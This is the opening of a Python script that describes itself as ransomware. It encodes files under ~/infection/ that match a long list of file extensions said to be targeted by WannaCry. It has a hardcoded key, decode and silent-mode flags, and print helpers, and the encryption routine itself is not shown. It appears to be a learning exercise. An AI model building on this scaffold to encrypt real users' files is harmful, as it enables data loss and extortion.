import argparse

extensions = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
    ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln",
    ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1",
    ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp",
    ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv",
    ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2",
    ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef",
    ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd",
    ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk",
    ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx",
    ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks",
    ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost",
    ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm",
    ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb",
    ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx",
    ".doc", ".ft"
]

key = "ha7d$572?X3fE:dkV3af"

def parse_args():
    parser = argparse.ArgumentParser(description="This randsomware will encode file at ~/infection/ whose extensions have been affected by Wannacry")
    parser.add_argument("-v", '--version', action='version', version='%(prog)s 1.0')
    parser.add_argument("-r", '--reverse', action='store_true', help="Decode encoded files")
    parser.add_argument('-s', '--silent', action='store_true', help='Execute in silent mode')
    return parser.parse_args()

args = parse_args()

def exit_error(error: str):
    prints(error)
    exit(1)

def prints(str_to_print: str):
    global args
    if not args.silent:
        print(str_to_print)